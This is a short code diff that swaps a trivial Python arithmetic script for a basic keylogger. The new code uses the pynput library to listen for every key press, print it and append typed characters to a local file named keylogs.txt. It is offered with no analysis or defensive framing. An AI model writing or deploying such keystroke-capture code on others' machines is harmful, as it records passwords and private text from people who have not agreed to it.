@@ -1,5 +1,15 @@
-a = 10 
-b = 20 
-print("hello")
-prod = a*b
-print(prod)
+from pynput import keyboard
+
+def keypressed(key):
+    print(str(key))
+    with open('keylogs.txt','a') as keylog:
+        try:
+            char = key.char
+            keylog.write(char)
+        except:
+            print('error occured')
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keypressed)
+    listener.start()
+    input()
